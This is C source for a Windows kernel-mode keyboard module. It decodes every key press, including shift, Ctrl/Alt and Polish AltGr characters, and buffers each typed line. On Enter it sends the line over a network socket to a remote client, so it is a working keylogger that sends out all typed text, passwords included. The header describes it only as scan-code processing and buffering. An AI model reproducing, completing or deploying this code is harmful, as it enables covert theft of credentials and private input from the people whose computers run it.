/*++
Module Name: scancode.c
Abstract: Processing scan codes & buffering logic.
Environment: Kernel mode only.
--*/

#include "scancode.h"
#include "network.h"

// Global keyboard state
ULONG g_KeyboardState = 0;
BOOLEAN g_RightAltPressed = FALSE;

// Network reset flag
volatile LONG g_NetworkResetNeeded = 0;

// Buffering constants
#define KEYBOARD_LINE_BUFFER_SIZE 512
#define KBD_POOL_TAG 'bkVK'

// Internal buffer structure
typedef struct _KEYBOARD_LINE_BUFFER {
    UCHAR Buffer[KEYBOARD_LINE_BUFFER_SIZE];
    volatile LONG Position;
    KSPIN_LOCK Lock;
    BOOLEAN Initialized;
} KEYBOARD_LINE_BUFFER, *PKEYBOARD_LINE_BUFFER;

static KEYBOARD_LINE_BUFFER g_LineBuffer = {0};
static PVOID g_NetworkBuffer = NULL; 

static const UCHAR g_BaseScancodes[89][12] = {
    "?", "[Esc]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BS]", "[Tab]",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[Ent]", "[LCt]", "a", "s",
    "d", "f", "g", "h", "j", "k", "l", ";", "\'", "`", "[LSh]", "\\", "z", "x", "c", "v",
    "b", "n", "m", ",", ".", "/", "[RSh]", "[KP*]", "[LAlt]", " ", "[Cap]", "[F1]", "[F2]", "[F3]", "[F4]", "[F5]",
    "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[Num]", "[Scr]", "[KP7]", "[KP8]", "[KP9]", "[KP-]", "[KP4]", "[KP5]", "[KP6]", "[KP+]", "[KP1]",
    "[KP2]", "[KP3]", "[KP0]", "[KP.]", "?", "?", "?", "[F11]", "[F12]"
};

static const UCHAR g_ShiftDigits[10][2] = { "!", "@", "#", "$", "%", "^", "&", "*", "(", ")" };
static const UCHAR g_ShiftChars[][2] = { "+", "{", "}", "|", ":", "\"", "~", "<", ">", "?" };
static const UCHAR g_E0Scancodes[18][12] = {
    "[RCt]", "[KP/]", "[Prt]", "[RAlt]", "[Hom]", "[Up]", "[PgU]", "[Lft]", "[Rgt]", "[End]", 
    "[Dn]", "[PgD]", "[Ins]", "[Del]", "[LWin]", "[RWin]", "[Men]", "?"
};
static const UCHAR g_PolishCharsAltGr[][4] = {
    "ą", "ć", "ę", "ł", "ń", "ó", "ś", "ź", "ż",
    "Ą", "Ć", "Ę", "Ł", "Ń", "Ó", "Ś", "Ź", "Ż"
};

// Scan code definitions
#define SC_CAPSLOCK     0x3A
#define SC_LSHIFT       0x2A
#define SC_RSHIFT       0x36
#define SC_NUMLOCK      0x45
#define SC_LALT         0x38
#define SC_LCTRL        0x1D
#define MAX_NORMAL_SC   0x58
#define MAX_E0_SC       0x5D

// Helper macros
#define IS_LETTER(sc) (((sc) >= 0x10 && (sc) <= 0x19) || ((sc) >= 0x1E && (sc) <= 0x26) || ((sc) >= 0x2C && (sc) <= 0x32))
#define IS_DIGIT(sc)  ((sc) >= 0x02 && (sc) <= 0x0B)
#define IS_SEND_TRIGGER(str) (strcmp((PCCHAR)(str), "[Ent]") == 0)

// Smart filter: exclude modifiers but allow special keys [F1-12], [Alt+X], [KP*], etc.
#define IS_MODIFIER(str) ((str)[0] == '[' && \
    strncmp((PCCHAR)(str), "[F", 2) != 0 && \
    strncmp((PCCHAR)(str), "[KP", 3) != 0 && \
    strncmp((PCCHAR)(str), "[LWin", 5) != 0 && \
    strncmp((PCCHAR)(str), "[RWin", 5) != 0 && \
    strncmp((PCCHAR)(str), "[Alt+", 5) != 0)

static VOID ToUpperCase(UCHAR* dest, const UCHAR* src) {
    SIZE_T i = 0;
    while (src[i] && i < 11) {
        dest[i] = (src[i] >= 'a' && src[i] <= 'z') ? (src[i] - 32) : src[i];
        i++;
    }
    dest[i] = '\0';
}

static PCUCHAR GetShiftedChar(UCHAR makeCode) {
    switch (makeCode) {
        case 0x0D: return g_ShiftChars[0]; case 0x1A: return g_ShiftChars[1]; 
        case 0x1B: return g_ShiftChars[2]; case 0x2B: return g_ShiftChars[3]; 
        case 0x27: return g_ShiftChars[4]; case 0x28: return g_ShiftChars[5];
        case 0x29: return g_ShiftChars[6]; case 0x33: return g_ShiftChars[7]; 
        case 0x34: return g_ShiftChars[8]; case 0x35: return g_ShiftChars[9]; 
        default: return NULL;
    }
}

VOID KbdHandler_InitializeBuffer(VOID) {
    KeInitializeSpinLock(&g_LineBuffer.Lock);
    g_LineBuffer.Position = 0;
    g_LineBuffer.Initialized = TRUE;
    if (g_NetworkBuffer == NULL) {
        g_NetworkBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, KEYBOARD_LINE_BUFFER_SIZE, KBD_POOL_TAG);
    }
}

VOID KbdHandler_SendBufferedLine(VOID) {
    NTSTATUS Status;
    SIZE_T BytesSent;
    KIRQL OldIrql;
    LONG LocalPosition;
    SOCKET LocalSocket;
    PUCHAR SendBuffer;

    if (!g_LineBuffer.Initialized || g_NetworkBuffer == NULL) return;

    KeAcquireSpinLock(&g_LineBuffer.Lock, &OldIrql);
    LocalPosition = g_LineBuffer.Position;
    
    if (LocalPosition > 0) {
        SendBuffer = (PUCHAR)g_NetworkBuffer;
        RtlZeroMemory(SendBuffer, KEYBOARD_LINE_BUFFER_SIZE);
        RtlCopyMemory(SendBuffer, (PVOID)g_LineBuffer.Buffer, LocalPosition);
        g_LineBuffer.Position = 0;
        KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);

        if (LocalPosition < KEYBOARD_LINE_BUFFER_SIZE - 1) {
             SendBuffer[LocalPosition] = '\n';
             LocalPosition++;
        }

        LocalSocket = (SOCKET)InterlockedCompareExchange64((LONG64*)&ClientSocket, (LONG64)ClientSocket, (LONG64)ClientSocket);
        if (LocalSocket != 0) {
            Status = WSKSendTo(LocalSocket, SendBuffer, LocalPosition, &BytesSent, 0, NULL, 0, NULL, NULL);
            if (!NT_SUCCESS(Status)) {
                 InterlockedExchange(&g_NetworkResetNeeded, 1);
            }
        }
    } else {
        KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
    }
}

VOID KbdHandler_FlushBuffer(VOID) {
    KbdHandler_SendBufferedLine();
}

BOOLEAN KbdHandler_AddToLineBuffer(_In_ PCUCHAR KeyString) {
    SIZE_T keyLen;
    KIRQL OldIrql;
    
    if (!g_LineBuffer.Initialized || KeyString == NULL) return FALSE;
    keyLen = strlen((PCCHAR)KeyString);
    if (keyLen == 0 || keyLen >= KEYBOARD_LINE_BUFFER_SIZE) return FALSE;

    if (IS_SEND_TRIGGER(KeyString)) {
        KbdHandler_SendBufferedLine();
        return TRUE;
    }
    
    // Ignore standalone modifiers to reduce noise (unless it's a [Alt+...] or [F...] tag)
    if (IS_MODIFIER(KeyString)) return FALSE; 

    KeAcquireSpinLock(&g_LineBuffer.Lock, &OldIrql);
    if (g_LineBuffer.Position + keyLen < KEYBOARD_LINE_BUFFER_SIZE) {
        RtlCopyMemory(&g_LineBuffer.Buffer[g_LineBuffer.Position], KeyString, keyLen);
        g_LineBuffer.Position += (LONG)keyLen;
    } 
    KeReleaseSpinLock(&g_LineBuffer.Lock, OldIrql);
    return FALSE;
}

VOID KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData) {
    UCHAR MakeCode;
    PCUCHAR KeyString = NULL;
    BOOLEAN IsKeyPress;
    UCHAR TempBuf[16];
    UCHAR UpperBuf[12];
    BOOLEAN ShiftActive, CapsActive, LCtrlActive, RCtrlActive, LAltActive;
    
    if (InputData == NULL) return;
    MakeCode = (UCHAR)InputData->MakeCode;
    IsKeyPress = !FlagOn(InputData->Flags, KEY_BREAK);
    
	// Handle Extended Keys (E0 prefix)
    if (FlagOn(InputData->Flags, KEY_E0)) {
        switch (MakeCode) {
            case 0x1D: 
                KeyString = g_E0Scancodes[0]; // R-Ctrl
                if (IsKeyPress) g_KeyboardState |= KBD_STATE_RCTRL;
                else g_KeyboardState &= ~KBD_STATE_RCTRL;
                break;
            case 0x35: KeyString = g_E0Scancodes[1]; break; // Num /
            case 0x37: KeyString = g_E0Scancodes[2]; break; // PrtSc
            case 0x38: 
                KeyString = g_E0Scancodes[3]; // R-Alt (AltGr)
                g_RightAltPressed = IsKeyPress; 
                break;
            case 0x47: KeyString = g_E0Scancodes[4]; break; // Home
            case 0x48: KeyString = g_E0Scancodes[5]; break; // Up
            case 0x49: KeyString = g_E0Scancodes[6]; break; // PgUp
            case 0x4B: KeyString = g_E0Scancodes[7]; break; // Left
            case 0x4D: KeyString = g_E0Scancodes[8]; break; // Right
            case 0x4F: KeyString = g_E0Scancodes[9]; break; // End
            case 0x50: KeyString = g_E0Scancodes[10]; break; // Down
            case 0x51: KeyString = g_E0Scancodes[11]; break; // PgDn
            case 0x52: KeyString = g_E0Scancodes[12]; break; // Ins
            case 0x53: KeyString = g_E0Scancodes[13]; break; // Del
            case 0x5B: 
                KeyString = g_E0Scancodes[14]; // LWin
                if (IsKeyPress) g_KeyboardState |= KBD_STATE_LWIN;
                else g_KeyboardState &= ~KBD_STATE_LWIN;
                break;
            case 0x5C: 
                KeyString = g_E0Scancodes[15]; // RWin
                if (IsKeyPress) g_KeyboardState |= KBD_STATE_RWIN;
                else g_KeyboardState &= ~KBD_STATE_RWIN;
                break;
            case 0x5D: KeyString = g_E0Scancodes[16]; break; // Menu
            default:   KeyString = g_E0Scancodes[17]; break;
        }
        if (MakeCode > MAX_E0_SC) return;
    } else {
        // Handle Normal Keys
        if (MakeCode > MAX_NORMAL_SC) return;
        
        // Update local state flags
        ShiftActive = (g_KeyboardState & KBD_STATE_SHIFT) != 0;
        CapsActive = (g_KeyboardState & KBD_STATE_CAPSLOCK) != 0;
        LCtrlActive = (g_KeyboardState & KBD_STATE_LCTRL) != 0;
        RCtrlActive = (g_KeyboardState & KBD_STATE_RCTRL) != 0;
        LAltActive = (g_KeyboardState & KBD_STATE_LALT) != 0;

        // Priority 1: Polish characters via AltGr OR (Left Ctrl + Left Alt)
        if ((g_RightAltPressed || (LCtrlActive && LAltActive)) && IsKeyPress) {
            switch (MakeCode) {
                case 0x1E: KeyString = g_PolishCharsAltGr[ShiftActive ? 9 : 0]; goto OutputKey;
                case 0x2E: KeyString = g_PolishCharsAltGr[ShiftActive ? 10 : 1]; goto OutputKey;
                case 0x12: KeyString = g_PolishCharsAltGr[ShiftActive ? 11 : 2]; goto OutputKey;
                case 0x26: KeyString = g_PolishCharsAltGr[ShiftActive ? 12 : 3]; goto OutputKey;
                case 0x31: KeyString = g_PolishCharsAltGr[ShiftActive ? 13 : 4]; goto OutputKey;
                case 0x18: KeyString = g_PolishCharsAltGr[ShiftActive ? 14 : 5]; goto OutputKey;
                case 0x1F: KeyString = g_PolishCharsAltGr[ShiftActive ? 15 : 6]; goto OutputKey;
                case 0x2D: KeyString = g_PolishCharsAltGr[ShiftActive ? 16 : 7]; goto OutputKey;
                case 0x2C: KeyString = g_PolishCharsAltGr[ShiftActive ? 17 : 8]; goto OutputKey;
            }
        }

        // Priority 2: Smart Left Alt Logic (Commands/Shortcuts)
        if (LAltActive && !LCtrlActive && !RCtrlActive && !g_RightAltPressed && IsKeyPress) {
            // Ensure we do NOT capture Modifiers here so state update works correctly.
            if (MakeCode != SC_LCTRL && MakeCode != SC_LSHIFT && MakeCode != SC_RSHIFT && 
                MakeCode != SC_CAPSLOCK && MakeCode != SC_NUMLOCK && MakeCode != SC_LALT) 
            {
                PCUCHAR BaseKey = g_BaseScancodes[MakeCode];
                
                // Format cleaning: [Tab] -> [Alt+Tab]
                if (BaseKey[0] == '[') {
                    char CleanKey[16];
                    SIZE_T len = strlen((PCCHAR)BaseKey);
                    if (len > 2 && len < 16) {
                        RtlStringCbCopyA(CleanKey, sizeof(CleanKey), (PCCHAR)BaseKey + 1);
                        CleanKey[len - 2] = '\0';
                        RtlStringCbPrintfA((NTSTRSAFE_PSTR)TempBuf, sizeof(TempBuf), "[Alt+%s]", CleanKey);
                    } else {
                        RtlStringCbPrintfA((NTSTRSAFE_PSTR)TempBuf, sizeof(TempBuf), "[Alt+%s]", BaseKey);
                    }
                } else {
                    RtlStringCbPrintfA((NTSTRSAFE_PSTR)TempBuf, sizeof(TempBuf), "[Alt+%s]", BaseKey);
                }
                KeyString = TempBuf;
                goto OutputKey;
            }
            // If modifier: Fall through -> Update State Machine
        }
        
        // Priority 3: Standard Letters, Digits, and Shifted Chars
        if (IS_LETTER(MakeCode)) {
            if ((LCtrlActive || RCtrlActive) && !LAltActive && IsKeyPress) {
                RtlStringCbPrintfA((NTSTRSAFE_PSTR)TempBuf, sizeof(TempBuf), "^%s", g_BaseScancodes[MakeCode]);
                KeyString = TempBuf;
            } else if ((ShiftActive && !CapsActive) || (!ShiftActive && CapsActive)) {
                ToUpperCase(UpperBuf, g_BaseScancodes[MakeCode]);
                KeyString = UpperBuf;
            } else {
                KeyString = g_BaseScancodes[MakeCode];
            }
        } else if (IS_DIGIT(MakeCode)) {
            KeyString = ShiftActive ? g_ShiftDigits[MakeCode - 0x02] : g_BaseScancodes[MakeCode];
        } else {
            PCUCHAR shifted = GetShiftedChar(MakeCode);
            KeyString = (ShiftActive && shifted != NULL) ? shifted : g_BaseScancodes[MakeCode];
        }
        
        // Update Global State Machine
        if (IsKeyPress) {
            switch (MakeCode) {
                case SC_CAPSLOCK: g_KeyboardState ^= KBD_STATE_CAPSLOCK; break;
                case SC_LSHIFT: case SC_RSHIFT: g_KeyboardState |= KBD_STATE_SHIFT; break;
                case SC_NUMLOCK:  g_KeyboardState ^= KBD_STATE_NUMLOCK; break;
                case SC_LCTRL:    g_KeyboardState |= KBD_STATE_LCTRL; break;
                case SC_LALT:     g_KeyboardState |= KBD_STATE_LALT; break;
            }
        } else {
            switch (MakeCode) {
                case SC_LSHIFT: case SC_RSHIFT: g_KeyboardState &= ~KBD_STATE_SHIFT; break;
                case SC_LCTRL:  g_KeyboardState &= ~KBD_STATE_LCTRL; break;
                case SC_LALT:   g_KeyboardState &= ~KBD_STATE_LALT; break;
            }
        }
    }
    
OutputKey:
    if (IsKeyPress && KeyString != NULL) {
        KbdHandler_AddToLineBuffer(KeyString);
    }
}

VOID KbdHandler_ConfigureMapping(_In_ PKEYBOARD_INPUT_DATA InputData) { UNREFERENCED_PARAMETER(InputData); }